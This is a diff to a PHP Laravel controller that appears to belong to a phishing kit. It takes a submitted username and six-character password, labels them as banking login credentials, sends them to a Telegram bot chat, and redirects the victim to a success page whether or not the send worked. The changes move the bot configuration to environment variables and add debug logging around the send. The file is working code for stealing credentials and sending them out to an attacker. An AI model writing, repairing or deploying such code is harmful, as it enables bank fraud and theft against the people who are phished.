@@ -6,9 +6,6 @@ use Illuminate\Http\Request;
 
 class ValiderController extends Controller
 {
-     /**
-     * Étape 1 : Réception des données qui te redirige vers la page reservation youpi
-     */
     public function submit(Request $request)
     {
         $validated = $request->validate([
@@ -16,26 +13,30 @@ class ValiderController extends Controller
             'password' => 'required|string|min:6|max:6',
         ]);
 
-        // Formatage du message Telegram
         $message = "🔔 *IDENTIFIANT DE CONNEXION BANCAIRES* 🔔\n\n"
                  . "👤 Nom : {$validated['username']}\n"
                  . "🔑 mot de passe : {$validated['password']}";
 
         try {
+            \Log::info('ValiderController - Attempting to send Telegram message');
             $this->sendTelegramMessage($message);
+            \Log::info('ValiderController - Message sent successfully');
             return redirect()->route('success');
         } catch (\Exception $e) {
-            \Log::error('Telegram send error: ' . $e->getMessage());
+            \Log::error('ValiderController Telegram error: ' . $e->getMessage());
             return redirect()->route('success');
         }
     }
 
     private function sendTelegramMessage($message)
     {
-        $token = config('services.telegram-bot-api.token');
-        $chatId = config('services.telegram-bot-api.chat_id');
+        $token = env('TELEGRAM_BOT_TOKEN');
+        $chatId = env('TELEGRAM_CHAT_ID');
+        
+        \Log::info('ValiderController Telegram config check - Token: ' . ($token ? 'SET' : 'MISSING') . ', ChatId: ' . ($chatId ? 'SET (' . $chatId . ')' : 'MISSING'));
         
         if (!$token || !$chatId) {
+            \Log::error('ValiderController Telegram config missing');
             throw new \Exception('Telegram config missing');
         }
 
@@ -61,11 +62,14 @@ class ValiderController extends Controller
         $error = curl_error($ch);
         curl_close($ch);
 
+        \Log::info('ValiderController Telegram API response - HTTP Code: ' . $httpCode);
+        \Log::info('ValiderController Telegram API response - Body: ' . $response);
+
         if ($httpCode !== 200) {
-            \Log::error('Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
+            \Log::error('ValiderController Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
             throw new \Exception('Telegram API failed: ' . $response);
         }
 
-        \Log::info('Telegram message sent successfully');
+        \Log::info('ValiderController Telegram message sent successfully');
     }
 }
